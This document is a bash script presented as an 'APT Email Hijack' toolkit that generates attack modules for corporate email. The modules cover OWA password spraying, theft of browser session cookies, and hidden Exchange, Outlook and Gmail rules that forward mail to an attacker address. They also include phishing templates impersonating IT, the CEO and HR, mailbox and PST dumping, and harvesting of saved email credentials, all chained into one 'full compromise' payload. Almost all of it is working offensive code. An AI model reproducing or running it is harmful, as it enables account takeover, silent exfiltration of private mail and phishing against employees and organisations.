#!/bin/bash
# ============================================
# APT EMAIL HIJACK v1.0
# OWA Access | Auto-Forward | Internal Phish
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

EMAIL_DIR="$HOME/c2_server/modules/corporate/email_hijack"
PAYLOAD_DIR="$HOME/c2_server/payloads"
LOG_DIR="$HOME/c2_server/logs"

mkdir -p "$EMAIL_DIR" "$PAYLOAD_DIR" "$LOG_DIR"

# === EXCHANGE/OWA ACCESS ===
generate_owa_access() {
    echo -e "\n${CYAN}[OWA Access Script]${NC}"
    
    cat > "$EMAIL_DIR/owa_access.sh" << 'OWA'
#!/bin/bash
# OUTLOOK WEB ACCESS (OWA) EXPLOIT
# Password spray | Session hijack | Mailbox dump

echo "[*] OWA/Exchange Access..."

# Find Exchange server
echo "  [*] Finding Exchange servers..."
nslookup -type=A mail 2>/dev/null | grep "Address" | awk '{print $2}'
nslookup -type=A owa 2>/dev/null | grep "Address" | awk '{print $2}'
nslookup -type=A outlook 2>/dev/null | grep "Address" | awk '{print $2}'
nslookup -type=MX autodiscover 2>/dev/null | grep "mail exchanger"

# Password spray against OWA
echo "  [*] Password spray against OWA..."
OWA_URL="https://mail.company.com/owa"

# Common passwords
PASSWORDS=("Company123" "Summer2024" "Winter2024" "Password1" "Welcome123" "${DOMAIN}2024")

# Get user list
USERS_FILE="/tmp/domain_users.txt"

if [ -f "$USERS_FILE" ]; then
    while read -r user; do
        for pass in "${PASSWORDS[@]}"; do
            response=$(curl -s -o /dev/null -w "%{http_code}" \
                -d "destination=https://mail.company.com/owa/&username=$user&password=$pass" \
                "$OWA_URL/auth.owa" 2>/dev/null)
            
            if [ "$response" = "302" ]; then
                echo "  [!] VALID: $user : $pass"
                echo "$user:$pass" >> "$EMAIL_DIR/valid_owa_accounts.txt"
            fi
        done
    done < "$USERS_FILE"
fi

# Steal OWA cookies for session hijack
echo "  [*] OWA session cookies:"
find / -name "cookies.sqlite" -path "*/.mozilla/*" 2>/dev/null -exec sqlite3 {} "SELECT * FROM moz_cookies WHERE host LIKE '%mail%' OR host LIKE '%owa%' OR host LIKE '%outlook%';" \;

echo "[+] OWA access complete"
OWA
    chmod +x "$EMAIL_DIR/owa_access.sh"
    echo -e "${GREEN}[+]${NC} OWA Access: $EMAIL_DIR/owa_access.sh"
}

# === AUTO-FORWARD RULES ===
generate_auto_forward() {
    echo -e "\n${CYAN}[Auto-Forward Rule Generator]${NC}"
    
    cat > "$EMAIL_DIR/auto_forward.sh" << 'AUTOFWD'
#!/bin/bash
# AUTO-FORWARD RULE SETUP
# Silently forwards all emails to attacker

echo "[*] Setting up auto-forward rules..."

ATTACKER_EMAIL="${1:-attacker@c2-server.com}"

# Method 1: Exchange Web Services (EWS)
echo "  [*] Method 1: Exchange EWS Rules"

cat > /tmp/create_rule.xml << 'EWSRULE'
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013"/>
  </soap:Header>
  <soap:Body>
    <m:UpdateInboxRules>
      <m:MailboxSmtpAddress>victim@company.com</m:MailboxSmtpAddress>
      <m:Operations>
        <t:CreateRuleOperation>
          <t:Rule>
            <t:DisplayName>System Alert</t:DisplayName>
            <t:Priority>1</t:Priority>
            <t:IsEnabled>true</t:IsEnabled>
            <t:Conditions>
              <t:ContainsSubjectStrings>
                <t:String>invoice</t:String>
                <t:String>payment</t:String>
                <t:String>urgent</t:String>
              </t:ContainsSubjectStrings>
            </t:Conditions>
            <t:Actions>
              <t:ForwardToRecipients>
                <t:Address>
                  <t:EmailAddress>ATTACKER_EMAIL</t:EmailAddress>
                </t:Address>
              </t:ForwardToRecipients>
            </t:Actions>
          </t:Rule>
        </t:CreateRuleOperation>
      </m:Operations>
    </m:UpdateInboxRules>
  </soap:Body>
</soap:Envelope>
EWSRULE

sed -i "s/ATTACKER_EMAIL/$ATTACKER_EMAIL/g" /tmp/create_rule.xml

curl -X POST -H "Content-Type: text/xml" \
    -d @/tmp/create_rule.xml \
    "https://mail.company.com/EWS/Exchange.asmx" 2>/dev/null

# Method 2: Outlook Desktop (COM Object via PowerShell)
echo "  [*] Method 2: Outlook Desktop Rules"

cat > /tmp/outlook_rule.ps1 << 'OUTLOOKRULE'
$Outlook = New-Object -ComObject Outlook.Application
$Namespace = $Outlook.GetNameSpace("MAPI")
$Inbox = $Namespace.GetDefaultFolder(6)  # 6 = Inbox

$Rules = $Outlook.Session.DefaultStore.GetRules()
$Rule = $Rules.Create("System Notification", 0)  # 0 = on receive

# Condition: All messages
$Condition = $Rule.Conditions

# Action: Forward
$Action = $Rule.Actions
$Action.Forward.Enabled = $true
$Action.Forward.Recipients.Add("ATTACKER_EMAIL")

$Rules.Save()
OUTLOOKRULE

# Method 3: Gmail/Google Workspace Filters
echo "  [*] Method 3: Gmail Forwarding Filters"

cat > /tmp/gmail_filter.xml << 'GMAILFILTER'
<?xml version='1.0' encoding='utf-8'?>
<feed xmlns='http://www.w3.org/2005/Atom' xmlns:apps='http://schemas.google.com/apps/2006'>
  <entry>
    <apps:property name='from' value='*'/>
    <apps:property name='forwardTo' value='ATTACKER_EMAIL'/>
    <apps:property name='shouldMarkAsRead' value='true'/>
    <apps:property name='shouldArchive' value='true'/>
    <apps:property name='sizeOperator' value='s_sl'/>
    <apps:property name='sizeThreshold' value='0'/>
  </entry>
</feed>
GMAILFILTER

echo "[+] Auto-forward rules created"
echo "[!] All emails now silently forwarded to: $ATTACKER_EMAIL"
AUTOFWD
    chmod +x "$EMAIL_DIR/auto_forward.sh"
    echo -e "${GREEN}[+]${NC} Auto-Forward: $EMAIL_DIR/auto_forward.sh"
}

# === INTERNAL PHISHING ENGINE ===
generate_internal_phish() {
    echo -e "\n${CYAN}[Internal Phishing Engine]${NC}"
    
    cat > "$EMAIL_DIR/internal_phish.sh" << 'INTPHISH'
#!/bin/bash
# INTERNAL PHISHING ENGINE
# Sends phishing from legitimate internal accounts

echo "[*] Internal Phishing Attack..."

# Template 1: "IT Security Update"
cat > /tmp/it_security_email.html << 'ITEMAIL'
<html>
<body style="font-family: Arial, sans-serif;">
<h2>⚠️ Urgent Security Update Required</h2>
<p>Dear employee,</p>
<p>Our security team has detected unusual activity on your account. 
Please verify your credentials immediately to prevent account suspension.</p>
<p><a href="https://mail-security-portal.com/verify" 
style="background: #d93025; color: white; padding: 10px 20px; 
text-decoration: none; border-radius: 5px;">
Verify Account Now</a></p>
<p style="color: #666; font-size: 12px;">This is an automated security alert.</p>
</body>
</html>
ITEMAIL

# Template 2: "CEO Urgent Request"
cat > /tmp/ceo_email.html << 'CEOEMAIL'
<html>
<body style="font-family: Arial, sans-serif;">
<p>Team,</p>
<p>I need you to review this document ASAP for the board meeting. 
This is time-sensitive.</p>
<p><a href="https://docs-sharing.com/review/doc123">📄 Review Document</a></p>
<p>Regards,<br><b>CEO Name</b></p>
</body>
</html>
CEOEMAIL

# Template 3: "HR Salary Update"
cat > /tmp/hr_email.html << 'HREMAIL'
<html>
<body style="font-family: Arial, sans-serif;">
<h3>📊 Salary Review 2024</h3>
<p>Your salary revision has been processed. View your updated compensation:</p>
<p><a href="https://hr-portal-verify.com/salary" 
style="background: #1a73e8; color: white; padding: 10px 20px; 
text-decoration: none; border-radius: 5px;">
View Salary Details</a></p>
<p style="color: #666; font-size: 12px;">Confidential — HR Department</p>
</body>
</html>
HREMAIL

echo "  [+] Email templates ready:"
echo "      1) IT Security Update"
echo "      2) CEO Urgent Request"
echo "      3) HR Salary Review"

# Send via compromised account
echo "  [*] Sending from compromised account..."
# curl -X POST "https://mail.company.com/EWS/SendEmail" ...

echo "[+] Internal phishing emails prepared"
INTPHISH
    chmod +x "$EMAIL_DIR/internal_phish.sh"
    echo -e "${GREEN}[+]${NC} Internal Phish: $EMAIL_DIR/internal_phish.sh"
}

# === MAILBOX DUMPER ===
generate_mailbox_dump() {
    echo -e "\n${CYAN}[Mailbox Dumper]${NC}"
    
    cat > "$EMAIL_DIR/mailbox_dump.sh" << 'MAILDUMP'
#!/bin/bash
# MAILBOX DUMPER
# Downloads entire mailbox via EWS/IMAP

echo "[*] Dumping mailbox..."

OUTPUT_DIR="$HOME/mailbox_dump"
mkdir -p "$OUTPUT_DIR"

# Method 1: EWS (Exchange Web Services)
echo "  [*] Method 1: EWS Mailbox Dump"

cat > /tmp/get_inbox.xml << 'EWSINBOX'
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Body>
    <m:FindItem Traversal="Shallow">
      <m:ItemShape>
        <t:BaseShape>AllProperties</t:BaseShape>
        <t:IncludeMimeContent>true</t:IncludeMimeContent>
      </m:ItemShape>
      <m:ParentFolderIds>
        <t:DistinguishedFolderId Id="inbox"/>
      </m:ParentFolderIds>
    </m:FindItem>
  </soap:Body>
</soap:Envelope>
EWSINBOX

# Method 2: IMAP
echo "  [*] Method 2: IMAP Dump"
# python3 -c "
# import imaplib, email
# mail = imaplib.IMAP4_SSL('mail.company.com')
# mail.login('victim@company.com', 'password')
# mail.select('inbox')
# result, data = mail.search(None, 'ALL')
# for num in data[0].split():
#     typ, msg_data = mail.fetch(num, '(RFC822)')
#     with open(f'$OUTPUT_DIR/email_{num}.eml', 'wb') as f:
#         f.write(msg_data[0][1])
# " 2>/dev/null

# Method 3: Search for PST/OST files
echo "  [*] Method 3: Local PST/OST Search"
find / -name "*.pst" -o -name "*.ost" 2>/dev/null | while read pst; do
    echo "  [+] Found: $pst"
    cp "$pst" "$OUTPUT_DIR/" 2>/dev/null
done

echo "[+] Mailbox dump saved: $OUTPUT_DIR"
MAILDUMP
    chmod +x "$EMAIL_DIR/mailbox_dump.sh"
    echo -e "${GREEN}[+]${NC} Mailbox Dump: $EMAIL_DIR/mailbox_dump.sh"
}

# === EMAIL PASSWORD HARVESTER ===
generate_email_pass_harvest() {
    echo -e "\n${CYAN}[Email Password Harvester]${NC}"
    
    cat > "$EMAIL_DIR/email_pass_harvest.sh" << 'PASSHARVEST'
#!/bin/bash
# EMAIL PASSWORD HARVESTER
# Extracts saved email credentials

echo "[*] Harvesting email credentials..."

OUTPUT="$HOME/email_credentials.txt"
echo "=== EMAIL CREDENTIALS ===" > "$OUTPUT"

# Outlook profiles
echo "  [*] Outlook profiles..."
find / -name "*.nk2" -o -name "*.pst" -o -name "*.ost" 2>/dev/null | while read profile; do
    echo "  [+] Profile: $profile"
    strings "$profile" 2>/dev/null | grep -E "@|password|credential" >> "$OUTPUT"
done

# Thunderbird profiles
echo "  [*] Thunderbird profiles..."
find / -name "logins.json" -path "*/thunderbird/*" 2>/dev/null | while read loginfile; do
    echo "  [+] Thunderbird logins: $loginfile"
    python3 -c "
import json, base64
with open('$loginfile') as f:
    data = json.load(f)
    for entry in data.get('logins', []):
        print(f\"Host: {entry['hostname']}\")
        print(f\"User: {entry['encryptedUsername']}\")
        print(f\"Pass: {entry['encryptedPassword']}\")
" 2>/dev/null >> "$OUTPUT"
done

# Mail clients configs
echo "  [*] Mail client configs..."
for config in /etc/mailrc /etc/msmtprc $HOME/.msmtprc $HOME/.muttrc; do
    [ -f "$config" ] && {
        echo "  [+] Config: $config"
        grep -E "user|pass|host|account" "$config" 2>/dev/null >> "$OUTPUT"
    }
done

echo "[+] Email credentials saved: $OUTPUT"
PASSHARVEST
    chmod +x "$EMAIL_DIR/email_pass_harvest.sh"
    echo -e "${GREEN}[+]${NC} Pass Harvester: $EMAIL_DIR/email_pass_harvest.sh"
}

# === GENERATE COMBINED PAYLOAD ===
generate_email_payload() {
    echo -e "\n${CYAN}[Generating Email Hijack Payload]${NC}"
    
    cat > "$PAYLOAD_DIR/email_hijack_payload.sh" << 'EMAILPAYLOAD'
#!/bin/bash
# APT EMAIL HIJACK PAYLOAD
# Full corporate email compromise

echo "╔══════════════════════════════════════╗"
echo "║  📧 EMAIL HIJACK — FULL COMPROMISE ║"
echo "╚══════════════════════════════════════╝"
echo ""

# Step 1: Get OWA access
echo "[1/5] Accessing OWA/Exchange..."
bash owa_access.sh 2>/dev/null

# Step 2: Harvest passwords
echo "[2/5] Harvesting email passwords..."
bash email_pass_harvest.sh 2>/dev/null

# Step 3: Setup auto-forward
echo "[3/5] Setting up auto-forward rules..."
bash auto_forward.sh 2>/dev/null

# Step 4: Dump mailboxes
echo "[4/5] Dumping mailboxes..."
bash mailbox_dump.sh 2>/dev/null

# Step 5: Internal phishing
echo "[5/5] Preparing internal phishing..."
bash internal_phish.sh 2>/dev/null

echo ""
echo "╔══════════════════════════════════════╗"
echo "║  ✅ EMAIL SYSTEM COMPROMISED!       ║"
echo "╚══════════════════════════════════════╝"
echo ""
echo "Achievements:"
echo "  ✓ OWA/Exchange access"
echo "  ✓ All emails forwarded to attacker"
echo "  ✓ Mailboxes dumped"
echo "  ✓ Internal phishing ready"
echo "  ✓ Can send as ANY employee"
EMAILPAYLOAD
    chmod +x "$PAYLOAD_DIR/email_hijack_payload.sh"
    echo -e "${GREEN}[+]${NC} Email payload: $PAYLOAD_DIR/email_hijack_payload.sh"
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║  📧 EMAIL HIJACK v1.0      ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} 🔓 OWA/Exchange Access"
        echo -e "  ${GREEN}2)${NC} ↩️  Auto-Forward Rules"
        echo -e "  ${GREEN}3)${NC} 🎣 Internal Phishing Engine"
        echo -e "  ${GREEN}4)${NC} 📦 Mailbox Dumper"
        echo -e "  ${GREEN}5)${NC} 🔑 Email Password Harvester"
        echo -e "  ${GREEN}6)${NC} 📲 Combined Payload"
        echo -e "  ${GREEN}7)${NC} 🚀 Generate ALL"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1) generate_owa_access ;;
            2) generate_auto_forward ;;
            3) generate_internal_phish ;;
            4) generate_mailbox_dump ;;
            5) generate_email_pass_harvest ;;
            6) generate_email_payload ;;
            7)
                generate_owa_access
                generate_auto_forward
                generate_internal_phish
                generate_mailbox_dump
                generate_email_pass_harvest
                generate_email_payload
                echo -e "\n${GREEN}[+]${NC} All email hijack tools generated!"
                ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
